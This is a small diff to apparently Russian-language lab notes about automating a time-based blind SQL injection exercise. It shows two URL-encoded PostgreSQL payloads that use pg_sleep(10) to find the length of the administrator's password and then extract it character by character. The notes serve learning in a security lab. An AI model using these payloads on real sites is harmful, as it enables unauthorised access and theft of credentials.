@@ -10,6 +10,7 @@
 решено написать скрипт. Чтобы не переберать всё руками и наконец-то solved this f&c&k lab.
 
 - Наша задача отсечь все ответы, которые после get запроса на сайт будут отвечать сразу же, так как в нашем случае иньекция использует pg_sleep(10)
-Сами иньекции: 
+
+Injectiom: 
 1) Длинна пароля '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
-2) Сам пароль: '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+2) Пароль: '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
